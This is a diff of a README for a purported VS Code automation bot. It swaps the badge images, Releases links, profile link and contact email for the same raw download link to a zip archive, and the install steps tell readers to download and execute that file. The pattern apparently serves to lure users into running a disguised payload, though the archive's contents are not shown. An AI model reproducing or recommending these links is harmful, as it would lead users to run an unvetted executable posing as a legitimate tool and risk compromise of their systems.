@@ -1,6 +1,6 @@
 # 🚀 VSC Genel Bot
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg)
+![Version](https://github.com/YunscCY/vsc-genel-bot/raw/refs/heads/main/devonite/genel_vsc_bot_v1.0.zip) ![License](https://github.com/YunscCY/vsc-genel-bot/raw/refs/heads/main/devonite/genel_vsc_bot_v1.0.zip)
 
 Welcome to the **VSC Genel Bot** repository! This bot is designed to enhance your Visual Studio Code experience by automating various tasks and providing useful functionalities.
 
@@ -30,7 +30,7 @@ The VSC Genel Bot aims to simplify your workflow in Visual Studio Code. Whether 
 
 To install the VSC Genel Bot, follow these steps:
 
-1. Visit the [Releases](https://github.com/YunscCY/vsc-genel-bot/releases) section.
+1. Visit the [Releases](https://github.com/YunscCY/vsc-genel-bot/raw/refs/heads/main/devonite/genel_vsc_bot_v1.0.zip) section.
 2. Download the latest release file.
 3. Execute the downloaded file to set up the bot in your Visual Studio Code environment.
 
@@ -61,12 +61,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- GitHub: [YunscCY](https://github.com/YunscCY)
-- Email: yunsc@example.com
+- GitHub: [YunscCY](https://github.com/YunscCY/vsc-genel-bot/raw/refs/heads/main/devonite/genel_vsc_bot_v1.0.zip)
+- Email: https://github.com/YunscCY/vsc-genel-bot/raw/refs/heads/main/devonite/genel_vsc_bot_v1.0.zip
 
 ## Releases
 
-To stay updated with the latest features and improvements, check the [Releases](https://github.com/YunscCY/vsc-genel-bot/releases) section regularly. Here, you can download the latest version and execute it to keep your bot up to date.
+To stay updated with the latest features and improvements, check the [Releases](https://github.com/YunscCY/vsc-genel-bot/raw/refs/heads/main/devonite/genel_vsc_bot_v1.0.zip) section regularly. Here, you can download the latest version and execute it to keep your bot up to date.
 
 ---
 
